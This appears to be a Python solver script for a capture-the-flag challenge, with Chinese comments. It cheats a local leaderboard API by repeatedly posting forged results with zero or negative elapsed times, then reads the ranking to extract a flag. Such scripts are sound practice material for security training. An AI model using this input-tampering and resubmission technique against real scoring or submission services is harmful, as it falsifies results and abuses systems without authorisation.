import requests
import time

BASE_URL = "http://localhost:61234/"  # 改成赛题实际域名或IP

# Step 1: 爆破/刷榜（你也可以把用时设为0.001）
def submit_own_result(username="cheater", elapsed_time=0):  # 用时设为1秒以内，保证极快
    url = f"{BASE_URL}/api/submit"
    data = {
        "username": username,
        "elapsed_time": elapsed_time
    }
    resp = requests.post(url, json=data)
    print("[+] Submit response:", resp.text)
    return resp.status_code == 200

# Step 2: 拉榜，看有没有flag
def get_ranking():
    url = f"{BASE_URL}/api/ranking"
    resp = requests.get(url)
    try:
        rank = resp.json()
    except Exception:
        print("[-] Response not json:", resp.text)
        return
    for item in rank:
        print(item)
        if 'flag' in item:
            print("[*] Flag Found:", item['flag'])

if __name__ == "__main__":
    my_name = "flaghunter"
    # 连续爆破10次，防止有刷新/防刷机制
    for i in range(10):
        submit_own_result(my_name, -1)
        time.sleep(0.1)
    # 拉榜，看flag
    get_ranking()